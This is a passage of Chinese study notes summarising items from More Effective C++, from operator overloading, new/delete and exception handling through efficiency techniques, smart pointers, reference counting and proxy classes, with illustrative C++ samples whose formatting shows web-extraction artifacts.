C++对于“真假值表达式”采用“骤死式”评估方式。意思是一旦该表达式的真假值确定，即使表达式中还有部分尚未检验，整个评估工作仍告结束。 “函数调用”语义和“骤死式”语义有两个重大的区别。 第一，当函数调用动作被执行，所有参数值都必须评估完成，所以当我们调用 operator&amp;&amp;和 operator||时，两个参数都已评估完成。换句话说没有什么骤死式语义。 第二，C++语言规范并未明确定义函数调用动作中各参数的评估顺序，所以没办法知道 expression1 和 expression2 哪个会先被评估。这与骤死式评估法形成一个明确的对比，后者总是由左向右评估其自变量。 C++同样也有一些规则用来定义逗号操作符面对内建类型的行为。表达式如果内含逗号，那么逗号左侧会先被评估，然后逗号的右侧再被评估；最后，整个逗号表达式的结果以逗号右侧的值为代表。 12// 其中 ++i, --j 表达式的结果是 --j 的值for (int i = 0, j = strlen(s)-1; i &lt; j; ++i, --j) ... 其他不能重载的操作符还有: 123. .* new delete :: sizeof typeid ?:static_cast dynamic_cast const_cast reinterpret_cast 可以重载： 123456789101112operator new operator deleteoperator new[] operator delete[]! + * / % ^ &amp; | ~ = &lt; &gt; += -= *= /= %=^= &amp;= |= &lt;&lt; &gt;&gt; &gt;&gt;= &lt;&lt;= == !=&lt;= &gt;= &amp;&amp; || ++ -- , -&gt;* -&gt;() [] 条款 8：了解各种不同意义的new和 delete new operator 1string *ps = new string(\"Memory Management\"); 以上使用的 new 是 new operator。这个操作符是由语言内建的，就像sizeof 那样，不能被改变意义，总是做相同的事情。它的动作分为两方面。 第一，它分配足够的内存，用来放置某类型的对象。第二，它调用一个 constructor，为刚才分配的内存中的那个对象设定初值。 new operator 总是做这两件事，无论如何你不能够改变其行为。 operator new 你能够改变的是用来容纳对象的那块内存的分配行为。new operator 调用某个函数，执行必要的内存分配动作，你可以重写或重载那个函数，改变其行为。这个函数的名称叫做 operator new。 1void * operator new(size_t size); 返回值类型是 void*，因为这个函数返回一个未经处理（raw）的指针，未初始化的内存。就象 malloc 一样，operator new 的职责只是分配内存。它对构造函数一无所知。 当你的编译器遇见这样的语句： 1string *ps = new string(\"Memory Management\"); 它生成的代码或多或少与下面的伪代码相似： 123void *memory = operator new(sizeof(string)); call string::string(\"Memory Management\") on *memory;string *ps = static_cast&lt;string*&gt;(memory); placement new 如果被调用的 operator new 除了接受“一定得有的 size_t 自变量”之外，还接受了一个 void＊ 参数，指向一块内存，准备用来接受构造好的对象。这样的operator new 就是 placement new。 1void * operator new(size_t, void *location); 总结 如果你希望将对象产生于 heap，请使用 new operator。它不但分配内存而且为该对象调用一个constructor。 如果你只是打算分配内存，请调用 operator new，那就没有任何 constructor 会被调用。 如果你打算在 heap objects 产生时自己决定内存分配方式，请写一个自己的 operator new，并使用 new operator，它将会自动调用你所写的 operator new。 如果你打算在已分配（并拥有指针）的内存中构造对象，请使用placement new。 三、异常 如果一个函数利用“设定状态变量”的方式或是利用“返回错误码”的方式发出一个异常信号，无法保证此函数的调用者会检查那个变量或检验那个错误码。于是程序的执行可能会一直继续下去，远离错误发生地点。 但是如果函数以抛出 exception 的方式发出异常信号，而该 exception 未被捕捉，程序的执行便会立刻中止。 如果你需要一个“绝对不会被忽略的”异常信号发射方法，而且发射后的 stack 处理过程又能够确保局部对象的 destructors 被调用，那么你需要 C++ exceptions。 条款 9：利用 destructors避免泄漏资源 解决办法就是，以一个“类似指针的对象”取代指针。如此一来，当这个类似指针的对象被销毁，我们可以令其 destructor 调用delete。“行为类似指针”的对象我们称为 smart pointers。 C++提供一个名为 auto_ptr 的智能指针。隐藏在 auto_ptr 背后的观念是，以一个对象存放“必须自动释放的资源”，并依赖该对象的destructor 释放。 只要坚持这个规则，把资源封装在对象内，通常便可以在 exceptions 出现时避免泄漏资源。 一个 auto_ptr 的实现示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960template &lt;typename T&gt; class autoPtr &#123;public: explicit autoPtr(T* p = 0); template &lt;typename U&gt; autoPtr(autoPtr&lt;U&gt;&amp; rhs); ~autoPtr(); template &lt;typename U&gt; autoPtr&lt;T&gt;&amp; operator=(autoPtr&lt;U&gt;&amp; rhs); T&amp; operator*() const; T* operator-&gt;() const; T* get() const; T* release(); void reset(T* p = 0);private: T* pointee; // 书上示例代码，这里有个特化模板友元，显然是个错误&#125;;template &lt;typename T&gt; autoPtr&lt;T&gt;::autoPtr(T* p) : pointee(p) &#123;&#125;template &lt;typename T&gt;template &lt;typename U&gt;autoPtr&lt;T&gt;::autoPtr(autoPtr&lt;U&gt;&amp; rhs) : pointee(rhs.release()) &#123;&#125;// operator= 使用 copy and swap 也可template &lt;typename T&gt;template &lt;typename U&gt;autoPtr&lt;T&gt;&amp; autoPtr&lt;T&gt;::operator=(autoPtr&lt;U&gt;&amp; rhs) &#123; if (this != rhs) reset(rhs.release()); return *this;&#125;template &lt;typename T&gt; autoPtr&lt;T&gt;::~autoPtr() &#123; delete pointee; &#125;template&lt;typename T&gt;T&amp; autoPtr&lt;T&gt;::operator*() const &#123; return *pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::operator-&gt;() const &#123; return pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::get() const &#123; return pointee; &#125;template&lt;typename T&gt;T* autoPtr&lt;T&gt;::release() &#123; T* oldPointee = pointee; pointee = 0; return oldPointee;&#125;template&lt;typename T&gt;void autoPtr&lt;T&gt;::reset(T* p) &#123; if (pointee != p) &#123; delete pointee; pointee = p; &#125;&#125; 条款 10：在 constructors内阻止资源泄漏（resource leak） C++只能析构被完全构造的对象（fully contructed objects）, 只有一个对象的构造函数完全运行完毕，这个对象才被完全地构造。若因为异常导致构造函数没有执行完毕，那么也不会调用析构函数。 由于 C++不自动清理那些“构造期间抛出exceptions”的对象，所以你必须设计你的constructors，使它们能够自我清理。 通常这只需将所有可能的 exceptions 捕捉起来，执行某种清理工作，然后重新抛出exception，使它继续传播出去即可。 另外，member initializaion list 是在构造函数之前进行的，所以可以利用这一点，可以让某系操作在构造函数之前进行，并处理异常。比如： 123456789101112131415161718192021222324252627282930313233343536373839404142434445class BookEntry &#123; public: ...private: string theName; string theAddress; list&lt;PhoneNumber&gt; thePhones; // Image *theImage; // AudioClip *theAudioClip; Image * initImage(const string&amp; imageFileName); AudioClip * initAudioClip(const string&amp; audioClipFileName);&#125;; BookEntry::BookEntry(const string&amp; name, const string&amp; address, const string&amp; imageFileName, const string&amp; audioClipFileName): theName(name), theAddress(address), theImage(initImage(imageFileName)), theAudioClip(initAudioClip(audioClipFileName))&#123;&#125;// theImage 被首先初始化,所以即使这个初始化失败也 // 不用担心资源泄漏，这个函数不用进行异常处理。Image * BookEntry::initImage(const string&amp; imageFileName) &#123; if (imageFileName != \"\") return new Image(imageFileName); else return 0;&#125;// theAudioClip 被第二个初始化, 所以如果在 theAudioClip // 初始化过程中抛出异常，它必须确保 theImage 的资源被释放。 // 因此这个函数使用 try...catch 。 AudioClip * BookEntry::initAudioClip(const string&amp;, audioClipFileName)&#123; try &#123; if (audioClipFileName != \"\") return new AudioClip(audioClipFileName); else return 0; &#125; catch (...) &#123; delete theImage; throw; &#125;&#125; 如果你以 auto_ptr 对象来取代 pointer class members，免除了“exceptions 出现时发生资源泄漏”的危机，不再需要在 destructors 内亲自动手释放资源。 12345678910111213141516class BookEntry &#123; public: ...private: ... const auto_ptr&lt;Image&gt; theImage; const auto_ptr&lt;AudioClip&gt; theAudioClip; &#125;;BookEntry::BookEntry(const string&amp; name, const string&amp; address, const string&amp; imageFileName, const string&amp; audioClipFileName): theName(name), theAddress(address), theImage(imageFileName != \"\" ? new Image(imageFileName) : 0),theAudioClip(audioClipFileName != \"\" ? new AudioClip(audioClipFileName) : 0)&#123;&#125; 条款 11：禁止异常（exceptions）流出destructors之外 两种情况下 destructor 会被调用。 第一种情况是当对象在正常状态下被销毁，也就是当它离开了它的生存空间（scope）或是被明确地删除； 第二种情况是当对象被 exception 处理机制销毁，也就是exception 传播过程中的 stack-unwinding（栈展开）机制。 如果控制权基于 exception 的因素离开 destructor，而此时正有另一个 exception 处于作用状态，C++会调用 terminate 函数，将你的程序结束掉，甚至不等局部对象被销毁。 全力阻止 exceptions 传出 destructors之外： 第一，它可以避免 terminate 函数在 exception 传播过程的栈展开（stack-unwinding）机制中被调用； 第二，它可以协助确保 destructors 完成其应该完成的所有事情。 条款 12：了解“抛出一个exception”与“传递一个参数”或“调用一个虚函数”之间的差异 第一，exception objects 总是会被复制，如果以 by value 方式捕捉，它们甚至被复制两次。至于传递给函数参数的对象则不一定得复制。 第二，“被抛出成为 exceptions”的对象，相比于“被传递到函数去”的对象，其合法的类型转换更少。 第三，catch 子句以其“出现于源代码的顺序”被编译器检验比对，其中第一个匹配成功者便执行；而当我们以某对象调用一个虚函数，被选中执行的是那个“与对象类型最佳吻合”的函数，不论它是不是源代码所列的第一个。 条款 13：以 by reference方式捕捉 exceptions 如果 catch by reference， 可以避开对象删除问题； 可以避开 exception objects 的切割（slicing）问题； 可以保留捕捉标准 exceptions 的能力； 约束了 exception objects 需被复制的次数。 12345try &#123; ...&#125; catch (exception&amp; ex) &#123; ...&#125; 条款 14：明智运用 exception specification 1234567void f1(); // 可以抛出任意的异常// exception specification 声明其只能抛出 int 类型的异常void f2() throw(int) &#123; ... f1(); // 即使 f1 抛出不是 int 类型的异常，也是合法的 ... &#125; 结论是： 不应该将 templates 和 exception specifications 混合使用。 如果A 函数内调用了 B 函数，而 B 函数无 exception specifications，那么 A 函数本身也不要设定exception specifications。 处理“系统”可能抛出的exceptions。其中最常见的就是 bad_alloc，那是在内存分配失败时由operator new 和 operator new[]抛出的。 条款 15：了解异常处理（exception handling）的成本 为了能够在运行时期处理 exceptions，程序必须做大量记录工作。在每一个执行点，它们必须能够确认“如果发生 exception，哪些对象需要析构”，它们必须在每一个 try 语句块的进入点和离开点做记号，针对每个 try 语句块它们必须记录对应的 catch 子句及能够处理的 exceptions 类型。 try 语句块，无论何时使用它，都得为此付出代价。不同的编译器实现 try 块的方法不同，所以编译器与编译器间的开销也不一样。粗略地估计，如果你使用 try 块，代码将膨胀5％－10％并且运行速度也同比例减慢。exception specification 通常也有与 try 块一样多的系统开销。 如果是因为异常而导致函数返回，函数的执行速度通常会比正常情况下慢 3 个数量级。当然，只有在抛出 exception 时才会承受这样的开销。 四、效率 条款 16：谨记 80-20 法则 80-20 法则说：一个程序 80%的资源用于 20%的代码身上。是的，80%的执行时间花在大约 20%的代码身上，80%的内存被大约 20%的代码使用，80%的磁盘访问动作由 20%的代码执行，80%的维护力气花在 20%的代码上面。 软件的整体性能几乎总是由代码的一小部分决定。 条款 17：考虑使用 lazy evaluation（缓式评估） lazy evaluation（缓式评估）。延缓运算，直到那些运算结果刻不容缓地被迫切需要为止。如果其运算结果一直不被需要，运算也就一直不执行。 在你真正需要之前，不必着急为某物做一个副本。在某些应用领域，你常有可能永远不需要提供那样一个副本。 实现 lazy fetching 时，你必须面对一个问题：null 指针可能会在任何 member functions（包括const member functions）内被赋值，以指向真正的数据。然而当你企图在 const member functions 内修改 data members，编译器不会同意。除非将指针字段声明为 mutable。 lazy evaluation 在许多领域中都可能有用途：可避免非必要的对象复制，可区别 operator[] 的读取和写动作，可避免非必要的数据库读取动作，可避免非必要的数值计算动作。 条款 18：分期摊还预期的计算成本 另一种改善软件性能的方法是：令它超前进度地做“要求以外”的更多工作。该方法可称为超急评估（over-eager evaluation）：在被要求之前就先把事情了。 Over-eager evaluation 背后的观念是，如果你预期程序常常会用到某个计算，你可以降低每次计算的平均成本，办法就是设计一份数据结构以便能够极有效率地处理需求，比如实时更新max、min等值，当需要使用时直接取值，而不用计算。 Caching 是“分期摊还预期计算之成本”的一种做法，Prefetching（预先取出）则是另一种做法。 这些思想很常见很有用，cache 自不用多说。对于 prefetching，比如，prefetch内存数据时，总是按页大小进行成块取数据，局部性原理告诉我们相邻的数据通常会更可能被需要。有时对象太大超过页大小，就会增加换页活动，缓存命中率下降，造成性能损失。 可通过over-eager evaluation，如 caching 和 prefetching 等做法分摊预期运算成本，这和 lazy evaluation 并不矛盾。 当你必须支持某些运算而其结果并不总是需要的时候，lazy evaluation 可以改善程序效率。 当你必须支持某些运算而其结果几乎总是被需要，或其结果常常被多次需要的时候，over-eager evaluation 可以改善程序效率。 条款 19：了解临时对象的来源 C++ 临时对象是不可见的，不会在你的源代码中出现。只要你产生一个 non-heap object 而没有为它命名，便诞生了一个临时对象。 这种匿名对象通常发生于两种情况：一是当隐式类型转换（implicit type conversions）时产生，以求函数调用能够成功；二是当函数返回对象的时候。 隐式类型转换 123456size_t countChar(const string&amp; str, char ch);...char buffer[MAX_STRING_LEN];char c;...int ret = countChar(buffer, c); 看一下 countChar 的调用。第一个被传送的参数是字符数组，但是对应函数的正被绑定 的参数的类型是 const string&amp;。仅当消除类型不匹配后，才能成功进行这个调用。 编译器会建立一个 string 类型的临时对象。通过以 buffer 做为参数调用 string 的构造函数来初始化这个临时对象。countChar 的参数 str 被绑定在这个临时的 string 对象上。当 countChar 返回时，临时对象自动释放。 仅当通过传值（by value）方式传递对象 或 传递常量引用（reference-to-const）参数时，才会发生这些类型转换。当传递一个非常量引用（reference-to-non-const）参数对象，就不会发生。比如： 1234void uppercasify(string&amp; str);...char subtleBookPlug[] = \"Effective C++\"; uppercasify(subtleBookPlug); 这里假如产生一个临时对象，uppercasify会对string&amp;所指的临时对象进行修改，而不是对subtleBookPlug字符数组进行修改，显然和uppercasify函数设计的本意是不符合的，这显然是一个错误，却不易察觉。 所以，C++语言禁止为非常量引用（reference-to-non-const） 产生临时对象。以上情况并不会发生。 函数返回对象 1const Number operator+(const Number&amp; lhs, const Number&amp; rhs); 这个函数的返回值是临时的，因为它没有被命名，它只是函数的返回值。你必须为每次调用operator+ 构造和释放这个对象而付出代价。有时可以通过 返回值优化（return value optimization）可以将这个临时对象消灭掉。 总结 任何时候只要你看到一个 reference-to-const 参数，就极可能会有一个临时对象被产生出来绑定至该参数上。 任何时候只要你看到函数返回一个对象，就会产生临时对象（并于稍后销毁）。 条款 20：协助完成“返回值优化（RVO）” 可以用某种特殊写法来撰写函数，使它在返回对象时，能够让编译器消除临时对象的成本。 方法是：返回 constructor arguments 以取代对象。 123456789101112// 错误方法const Rational&amp; operator*(const Rational&amp; lhs, const Rational&amp; rhs) &#123; Rational result(lhs.numerator() * rhs.numerator(), lhs.denominator() * rhs.denominator()); return result; // 返回时，其指向的对象已经不存在了 &#125;// 正确方法const Rational operator*(const Rational&amp; lhs, const Rational&amp; rhs) &#123; return Rational(lhs.numerator() * rhs.numerator(), lhs.denominator() * rhs.denominator());&#125; 虽然仍旧必须为在函数内临时对象的构造和释放而付出代价。但是此时，编译器可以进行优化了。 1Rational c = a * b; 编译器会消除在 operator* 内的临时变量和 operator* 返回的临时变量。直接在 c 的内存里构造 return 表达式定义的对象。调用 operator* 的临时对象的开销就是零：没有建立临时对象。 利用函数的 return 点消除一个局部临时对象，这种方法很常见，被称之为 return value optimization。 条款 21：利用重载技术（overload）避免隐式类型转换（implicit type conversion） 在重载操作符时，每个重载函数的参数必须至少一个是“用户定制类型”的自变量。如果不是，就会改变C++内部预先定义的操作符意义（参数类型全是内置类型），而那当然会导致天下大乱。 12345678910// 合理的设计const UPInt operator+(const UPInt&amp; lhs, const UPInt&amp; rhs);const UPInt operator+(const UPInt&amp; lhs, int rhs);const UPInt operator+(int lhs, const UPInt&amp; rhs);// 错误const UPInt operator+(int lhs, int rhs); 增加一堆重载函数不一定是好事，除非能保证这样对程序效率有很大的改善。 条款 22：考虑以操作符复合形式（op=）取代其独身形式（op） 一个好方法就是以复合形式（例如，operator+=）为基础实现独身形式（例如，operator+）。 3 个与效率有关的情况值得注意。 第一，一般而言，复合操作符比其对应的独身版本效率高。因为独身版本通常必须返回一个新对象，而我们必须因此负担一个临时对象的构造和析构成本（见条款 19和 20）。复合版本则是直接将结果写入其左端自变量，所以不需要产生一个临时对象来放置返回值。 第二，如果同时提供某个操作符的复合形式和独身形式，那就是在允许你的客户在效率与便利性之间自行取舍。 第三、匿名对象总是比命名对象更容易被消除，所以当你面临命名对象或临时对象的抉择时，最好选择临时对象。匿名对象有可能降低成本（尤其在搭配旧式编译器时）。 条款 23：考虑使用其他程序库 不同的程序库即使提供相似的功能，也往往有不同的性能取舍策略，所以一旦你找出程序的瓶颈，你应该思考是否有可能使用其他程序库，来移除了那些瓶颈。 比如，iostream 相比于 stdio，iostream 有类型安全的特性，可扩展性好；而 stdio 更节省程序空间、速度更快。 条款 24：了解 virtual functions、multiple inheritance、virtual base class、runtime type identification的成本 当一个虚函数被调用，执行的代码必须对应于“调用者（对象）的动态类型”。 大部分编译器使用 virtual tables（vtbls）和 virtual table pointers（vptrs）实现动态类型。 virtual tables（vtbls） vtbl 通常是一个由“函数指针”数组。某些编译器会以链表（linked list）取代数组，但其基本策略相同。程序中的每一个class ，只要声明（或继承）虚函数者，都有自己的一个 vtbl，而其中的条目（entries）就是该 class 的各个虚函数具体实现的指针。 虚函数的第一个成本：你必须为每个拥有虚函数的 class 耗费一个 vtbl 空间，其大小视虚函数的个数（包括继承而来的）而定。 12345678910class C1 &#123; public: C1(); virtual ~C1(); virtual void f1(); virtual int f2(char c) const; virtual void f3(const string&amp; s); void f4() const; ...&#125;; C1 的 virtual table 数组看起来如下图所示: 注意非虚函数 f4 不在表中，而且 C1 的构造函数也不在。 12345678class C2: public C1 &#123; public: C2(); virtual ~C2(); virtual void f1(); virtual void f5(char *str); ... &#125;; 它的 virtual table 中包括指向没有被 C2 重定义的 C1 虚函数的指针： virtual table pointers（vptrs） Virtual tables 只是虚函数实现机构的一半而已。如果只有它，不能成气候。还需要某种方法可以指示出每个对象对应于哪一个 vtbl，vtbl 才真的有用。而这正是virtual table pointer（vptr）的任务。 凡声明有虚函数的 class，其对象都含有一个隐藏的 data member，vptr，用来指向该class 的 vtbl。这个隐藏的 data member 被编译器加入对象内某个只有编译器才知道的位置。 虚函数的第二个成本：你必须在每一个拥有虚函数的对象内付出“一个额外指针”的代价。 上述C1、C2对象关系可以表示为： 虚函数的调用 编译器必须产生代码，完成以下动作： 根据对象的 vptr 找出其 vtbl。编译器成本只有一个偏移调整（offset adjustment）就能获得 vptr，和一个指针间接动作，以便获得 vtbl。 找出被调用函数在 vtbl 内的对应指针。编译器为每个虚函数指定了一个独一无二的表格索引。本步骤的成本只是一个偏移（offset），在 vtbl 数组中索引。 调用步骤 2 所得指针所指向的函数。 RTTI 运行时期类型辨识（runtime typeidentification，RTTI）的成本。RTTI 让我们得以在运行时期获得 objects 和 class 的相关信息。它们被存放在类型为 type_info 的对象内。你可以利用 typeid 操作符取得某个class 相应的 type_info 对象。 C++规范书上说，只有当某种类型拥有至少一个虚函数，才保证我们能够检验该类型对象的动态类型。RTTI 的设计理念是：根据 class 的 vtbl 来实现。 RTTI 耗费的空间是在每个类的 vtbl 中的占用的额外单元再加上存储 type_info 对象的空间。就像在多数程序里 virtual table 所占的内存空间并不值得注意一样，你也不太可能因为 type_info 对象大小而遇到问题。 RTTI的代价：type_info 占用的空间。 假如 type_info 才是完整的 vtbl 内存布局： 多继承 多继承经常导致对虚基类的需求。 没有虚基类，如果一个派生类有一个以上从基类的继承路径，基类的数据成员被复制到每一个继承类对象里，继承类与基类间的每条路径都有一个拷贝。 把基类定义为虚基类则可以消除这种复制。 虚基类的实现经常使用指向虚基类的指针做为避免复制的手段，一个或者更多的指针被存储在对象里。 另一种代价：虚基类的实现经常使用指向虚基类的指针。 比如： 1234class A: &#123;...&#125;;class B: virtual public A &#123; ... &#125;;class C: virtual public A &#123; ... &#125;;class D: public B, public C &#123;...&#125;; 如果 A 中没有虚函数，D对象内存布局为： 如果 A 中有虚函数，D对象内存布局为： 五、技术 条款 25：将 constructor 和 non-member functions 虚化 此处所谓 virtual 不是虚函数的 virtual，而是类似、形似的意思。 模仿 constructor 的行为，但能够视其获得的输入，产生不同类型的对象，所以称之为 virtual constructor。Virtual constructor 在许多情况下有用，其中之一就是从磁盘（或网络或磁带等）读取对象信息。 例如，假设你编写一个程序，用来进行新闻报道的工作，每一条新闻报道都由文字或图片组成。 12345678910111213141516171819202122232425262728class NLComponent &#123; // 抽象基类，包含至少一个纯虚函数public: ...&#125;; class TextBlock: public NLComponent &#123; public: ... // 不包含纯虚函数&#125;; class Graphic: public NLComponent &#123; public: ... // 不包含纯虚函数&#125;; class NewsLetter &#123; public: NewsLetter(istream&amp; str); ...private: list&lt;NLComponent*&gt; components; // virtual constructor // 为建立下一个 NLComponent 对象从 str 读取数据 // 建立 component 并返回一个指针 static NLComponent* readComponent(istream&amp; str);&#125;;NewsLetter::NewsLetter(istream&amp; str) &#123; while (str) &#123; components.push_back(readComponent(str));&#125; &#125; readComponent 所做的工作。它根据所读取的数据建立了一个新对象，或是 TextBlock 或是 Graphic。 virtual copy constructor 是一种特别的 virtual constructor 。Virtual copy constructor 会返回一个指针，指向其调用者（某对象）的一个新副本。基于这种行为，virtual copy constructors 通常以 copySelf 或cloneSelf 命名，或者像下面一样命名为 clone。 12345678910111213141516171819202122232425262728293031323334class NLComponent &#123; // 抽象基类，包含至少一个纯虚函数public: virtual NLComponent * clone() const = 0; ...&#125;; class TextBlock: public NLComponent &#123; public: virtual TextBlock * clone() const &#123; return new TextBlock(*this); &#125; ...&#125;; class Graphic: public NLComponent &#123; public: virtual Graphic * clone() const &#123; return new Graphic(*this); &#125; ... &#125;;class NewsLetter &#123; public: NewsLetter(istream&amp; rhs); ...private: list&lt;NLComponent*&gt; components;&#125;;NewsLetter::NewsLetter(const NewsLetter&amp; rhs) &#123; // 遍历整个 rhs 链表，使用每个元素的虚拟拷贝构造函数 for (list&lt;NLComponent*&gt;::const_iterator it = rhs.components.begin(); it != rhs.components.end(); ++it) &#123; components.push_back((*it)-&gt;clone()); &#125;&#125; non-member functions 也可以进行虚化。编写一个虚函数来完成工作，然后再写一个非虚函数，它什么也不做只是调用这个虚函数。 1234567891011121314151617181920class NLComponent &#123; // 抽象基类，包含至少一个纯虚函数public: virtual ostream&amp; print(ostream&amp; s) const = 0; ...&#125;; class TextBlock: public NLComponent &#123; public: virtual ostream&amp; print(ostream&amp; s) const; ...&#125;; class Graphic: public NLComponent &#123; public: virtual ostream&amp; print(ostream&amp; s) const; ... &#125;;// 非虚函数，只调用虚 print，让print完成对应工作inline ostream&amp; operator&lt;&lt;(ostream&amp; s, const NLComponent&amp; c) &#123; return c.print(s); &#125; 条款 26：限制某个 class 所能产生的对象数量 每产生一个对象，会有一个 constructor被调用。 使用 static 控制对象数量的产生，是一种方法。首先要知道： class 拥有一个static成员对象时，即使从未使用到，也会被构造，且其初始化时机，并不明确； function 中有一个static对象，此对象在函数第一次被调用时才产生，且其初始化时机是明确的。 “阻止某个 class 产出对象” 的最简单方法就是将其 constructor 声明为 private。 一个限制对象数量的 class 设计，一个 Printer 对象实现： 12345678910111213141516171819202122232425262728293031323334353637383940class Printer &#123;public: class TooManyObjects&#123;&#125;; // 伪构造函数 static Printer * makePrinter(); static Printer * makePrinter(const Printer&amp; rhs); ...private: static size_t numObjects; static const size_t maxObjects = 10; Printer(); Printer(const Printer&amp; rhs); ~Printer() &#123; --numObjects; &#125;&#125;;// class static 必须进行定义size_t Printer::numObjects = 0; const size_t Printer::maxObjects;// 提取一个 init() 函数完成公用的初始化工作也是可以的Printer::Printer() &#123; if (numObjects &gt;= maxObjects) &#123; throw TooManyObjects(); &#125; ++numObjects; ...&#125; Printer::Printer(const Printer&amp; rhs) &#123; if (numObjects &gt;= maxObjects) &#123; throw TooManyObjects(); &#125; ++numObjects; ...&#125; Printer * Printer::makePrinter() &#123; return new Printer; &#125; Printer * Printer::makePrinter(const Printer&amp; rhs) &#123; return new Printer(rhs); &#125; 条款 27：要求（或禁止）对象产生于 heap 之中 有时你想这样管理某些对象，要让某种类型的对象能够自我销毁，也就是能够“delete this”。很明显这种管理方式需要此类型对象被分配在堆中。而其它一些时候你想获得一种 保障：“不在堆中分配对象，从而保证某种类型的类不会发生内存泄漏。” 判断对象是否在堆上，可以使用地址比较法，栈段地址从高到低生长，堆段地址从低到高生长。以下方法可以实现： 1234bool onHeap(const void *address) &#123; char onTheStack; return address &lt; &amp;onTheStack; &#125; 但是，static 对象的地址在堆段地址下方，以上方法并不能确定是否是静态对象。 另一种方式，是设计 abstract mixin base class 来实现判断堆对象的功能。 所谓 abstract base class 是一个不能够被实例化的 base class。也就是说它至少有一个纯虚函数。所谓 mixin（“mix in”）class 则提供一组定义完好的能力，能够与其 derived class 所可能提供的其他任何能力兼容。如此的 class 几乎总是abstract。于是可以设计 abstract mixin base class，用来为 derived class 提供“判断某指针是否以 oeprator new 分配出来”的能力。 1234567891011121314151617181920212223242526272829303132333435363738class HeapTracked &#123; // 混合类，跟踪从 operator new 返回的 ptrpublic: class MissingAddress&#123;&#125;; virtual ~HeapTracked() = 0; static void *operator new(size_t size); static void operator delete(void *ptr); bool isOnHeap() const;private: typedef const void* RawAddress; static list&lt;RawAddress&gt; addresses;&#125;;list&lt;RawAddress&gt; HeapTracked::addresses;// HeapTracked 的析构函数是纯虚函数，使得该类变为抽象类HeapTracked::~HeapTracked() &#123;&#125;void * HeapTracked::operator new(size_t size) &#123; void *memPtr = ::operator new(size); addresses.push_front(memPtr); return memPtr;&#125;void HeapTracked::operator delete(void *ptr) &#123; list&lt;RawAddress&gt;::iterator it = find(addresses.begin(), addresses.end(), ptr); if (it != addresses.end()) &#123; addresses.erase(it); ::operator delete(ptr); &#125; else &#123; throw MissingAddress(); &#125;&#125;bool HeapTracked::isOnHeap() const &#123; // 得到一个指针，指向*this占据的内存空间的起始处 const void *rawAddress = dynamic_cast&lt;const void*&gt;(this); list&lt;RawAddress&gt;::iterator it = find(addresses.begin(), addresses.end(), rawAddress); return it != addresses.end();&#125; 如果是在堆上分配内存，就会调用 operator new，可以通过 isOnHeap 判断是否在堆上。只要继承自 HeapTracked 类的子类，就都有了 isOnHeap 的功能。 如果要禁止对象在堆上分配内存，将 operator new 设计为 private 是一种简单的方式。 条款 28：Smart Pointers（智能指针） 当你以 smart pointers 取代 C++的内建指针（亦即 dumb pointers），你将获得以下各种指针行为的控制权： 构造和析构（Construction and Destruction）。你可以决定smart pointer 被产生以及被销毁时发生什么事。通常我们会给 smart pointers 一个默认值 nullptr，以避免“指针未获初始化”的头痛问题。某些 smart pointers 可以删除它们所指的对象，比如当指向该对象的最后一个 smart pointer 被销毁时。这是消除资源泄漏问题的一大进步。 复制和赋值（Copying and Assignment）。当一个 smart pointer 被复制或涉及赋值动作时，你可以控制发生什么事。某些 smart pointer 会希望在此时刻自动为其所指之物进行复制或赋值动作，也就是执行深复制（deep copy）。另一些 smart pointer 则可能只希望指针本身被复制或赋值就好。还有一些则根本不允许复制和赋值。不论你希望什么样的行为，smart pointer 都可以让你如愿。 解引（Dereferencing）。当 client 解引（取用）smart pointer 所指之物时，你有权决定发生什么事情。例如你可以利用 smart pointer 协助实现出条款 17 所说的 lazy fetching 策略。 Smart pointer的构造行为通常明确易解：确定一个目标物（通常是利用smart pointer 的 constructor 参数），然后让 smart pointer 内部的 dumb pointer 指向它。如果尚未决定目标物，就将内部指针设为 nullptr，或是发出一个错误消息（可能是抛出 exception）。 Smart pointer 不要提供对 dumb pointer 的隐式转换操作符，除非不得已。 在涉及继承相关的类型转换时，smart pointer 是做不到 dumb pointer 所能做的一切的。此时，别使用 smart pointer ，而是 dumb pointer 。 条款 29：Reference counting（引用计数） 通过 reference counting 可以建构出垃圾回收机制（garbage collection）的一个简单形式。Reference counting 的另一个发展动机则只是为了实现一种常识。如果许多对象有相同的值，将那个值存储多次是件愚蠢的事。最好是让所有等值对象共享一份实值就好。 copy-on-write “和其他对象共享一份实值，直到我们必须对自己所拥有的那一份实值进行写动作，才进行复制”，这就是：copy-on-write（写时才复制）。 特别是在操作系统领域，各进程（processes）之间往往允许共享某些内存分页（memory pages），直到它们打算修改属于自己的那一分页，才进行复制。这是提升效率的一般化做法（也就是 lazy evaluation，条款 17）。 实现 首先产生一个 base class RCObject，作为“reference-counted 对象”之用。RCObject 组成为： “引用计数器” 增减计数值的函数 一个函数，用来将不再被使用（也就是其引用次数为 0）的对象值销毁掉。 一个成员，用来追踪资源是否“可共享”，并提供查询其值、将该成员设为 false 等相关函数。在默认情况下为可共享状态。一旦某个对象被贴上“不可共享”标签，就没有办法再恢复其“可共享”的身份了。 其他 简单地说，以下是使用 reference counting 改善效率的最适当时机： 相对多数的对象共享相对少量的实值。这种共享行为通常是通过assignment operators 和 copy constructors。 对象实值的产生或销毁成本很高，或是资源占用内存很多。若实值（资源）可被多个对象共享，reference counting 能带来较高收益。 RCObject 的设计目的是用来作为有引用计数能力之“实值对象”的基类。 那些“实值对象”即实际的资源，设计 RCPtr smart pointer 进行管理（RAII保证）。 RCObject、RCPtr 不应该被外界看到，应为私有成员，以限制其用途。 条款 30：Proxy class（代理类） 凡“用来代表（象征）其他对象”的对象，常被称为 proxy objects（替身对象），而用以表现 proxy objects 者，我们称为 proxy class。 当 class 的身份从“与真实对象”移转到“与替身对象（proxies）”，往往会造成 class 语义的改变，因为 proxy objects 所展现的行为常常和真正对象的行为有些隐微差异。 在很多情况下，proxy 对象可以完美替代实际对象。当它们可以工作时，意味着两者间的差异并不影响什么。 多维数组 优化二维数组的使用形式： 12345678910111213141516171819template&lt;class T&gt;class Array2D &#123; public: class Array1D &#123; public: T&amp; operator[](int index); const T&amp; operator[](int index) const; ... &#125;; Array1D operator[](int index); const Array1D operator[](int index) const; ...&#125;;// Array1D 使得 data[][] 访问合法，否则只实现 Array2D 的话// 势必只能 data(dim1, dim2) 这样调用Array2D&lt;float&gt; data(10, 20);...cout &lt;&lt; data[3][6]; 左值/右值的区分 